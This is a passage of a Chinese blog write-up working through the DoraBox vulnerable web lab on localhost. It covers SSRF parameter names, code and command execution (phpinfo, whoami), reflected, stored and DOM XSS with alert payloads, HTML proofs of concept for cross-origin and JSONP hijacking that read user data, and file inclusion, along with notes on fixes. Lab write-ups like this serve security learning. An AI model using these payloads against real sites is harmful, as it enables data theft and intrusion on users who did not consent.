&lt;li&gt;对内网 web 应用进行指纹识别，识别企业内部的资产信息&lt;/li&gt;
&lt;li&gt;攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;任意代码执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意代码执行&#34;&gt;#&lt;/a&gt; 任意代码执行&lt;/h1&gt;
&lt;p&gt;根据题目提示，就是随便输代码，然后服务器执行脚本&lt;/p&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;phpinfo ()，查看 php 版本信息&lt;img src=&#34;dorabox_code002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;代码执行漏洞就是通过执行脚本代码，进行渗透&lt;/p&gt;
&lt;h1 id=&#34;任意命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意命令执行&#34;&gt;#&lt;/a&gt; 任意命令执行&lt;/h1&gt;
&lt;p&gt;根据题目提示，就是随便输命令&lt;/p&gt;
&lt;h2 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;whoami，查看服务器信息&lt;img src=&#34;dorabox_cmd001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-11&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;看源码是利用 exec () 函数，直接调用操作系统的命令&lt;/p&gt;
&lt;h1 id=&#34;反射xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射xss&#34;&gt;#&lt;/a&gt; 反射 XSS&lt;/h1&gt;
&lt;p&gt;输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_ref001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;加入 js 代码，alert 一下&lt;img src=&#34;dorabox_xss_ref002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-12&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;​	XSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。&lt;/p&gt;
&lt;h1 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;alert 试一下&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;alert(&lt;span class=&#34;string&#34;&gt;&amp;quot;/XSS/&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-13&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。&lt;/p&gt;
&lt;p&gt;漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数&lt;/p&gt;
&lt;h1 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;万能 alert，&lt;script&gt;alert(1)&lt;/script&gt;：&lt;img src=&#34;dorabox_xss_dom001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;带有 xss 的 url：&lt;a href=&#34;http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;amp;submit=submit&#34;&gt;http://localhost/dorabox/xss/dom_xss.php?name=&amp;lt;script&amp;gt;alert(1)&amp;lt;%2Fscript&amp;gt;&amp;amp;submit=submit&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看源码是在这里打印的： &lt;code&gt;document.write(getURLValue(&#39;name&#39;));&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-14&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。&lt;/p&gt;
&lt;p&gt;攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。&lt;/p&gt;
&lt;h1 id=&#34;csrf跨域资源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf跨域资源&#34;&gt;#&lt;/a&gt; CSRF 跨域资源&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd,sex:CoolMan=&#34;&#34;&gt;
&lt;li&gt;
&lt;p&gt;构造 html 来劫持&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Ajax&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Ajax 发送 get 请求&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ajax&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xhr = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.responseType = &lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.open(&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/csrf/userinfo.php&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.onreadystatechange= &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;e&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.status == &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;		alert(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.responseText);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt; &amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.send();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;ajax();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_ky001.png&#34; alt=&#34;&#34;&gt;内容：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-15&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;实话实说，这个就是借鉴网上的，解释一下js代码：

自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。

然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。

onreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;0: 请求未初始化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;1: 服务器连接已建立&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2: 请求已接收&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;3: 请求处理中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4: 请求已完成，且响应已就绪&lt;/p&gt;
&lt;p&gt;status	&lt;br&gt;
200: “OK”，404: 未找到页面&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后响应成功就 alert 返回的数据&lt;/p&gt;
&lt;p&gt;function ajax() {&lt;br&gt;
var xhr = new XMLHttpRequest();&lt;br&gt;
xhr.responseType = “text”;&lt;br&gt;
xhr.open(‘GET’, ‘&lt;a href=&#34;http://localhost/dorabox/csrf/userinfo.php&#34;&gt;http://localhost/dorabox/csrf/userinfo.php&lt;/a&gt;’, true);&lt;br&gt;
xhr.onreadystatechange= function(e) {&lt;br&gt;
if(this.status == 200){&lt;br&gt;
alert(this.responseText);&lt;br&gt;
}&lt;br&gt;
};&lt;br&gt;
xhr.send();&lt;br&gt;
}&lt;br&gt;
ajax();&lt;/p&gt;
&lt;h1 id=&#34;jsonp劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jsonp劫持&#34;&gt;#&lt;/a&gt; JSONP 劫持&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;来一个 csrf 攻击代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;JSONP劫持测试&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;result&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;            alert(result.address);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-16&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。&lt;/p&gt;
&lt;p&gt;没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。&lt;/p&gt;
&lt;h1 id=&#34;任意文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件包含&#34;&gt;#&lt;/a&gt; 任意文件包含&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_filein002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;直接文件包含，输出&lt;img src=&#34;dorabox_filein003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-17&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？&lt;/p&gt;
&lt;h1 id=&#34;任意文件包含-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件包含-2&#34;&gt;#&lt;/a&gt; 任意文件包含&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_filein002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
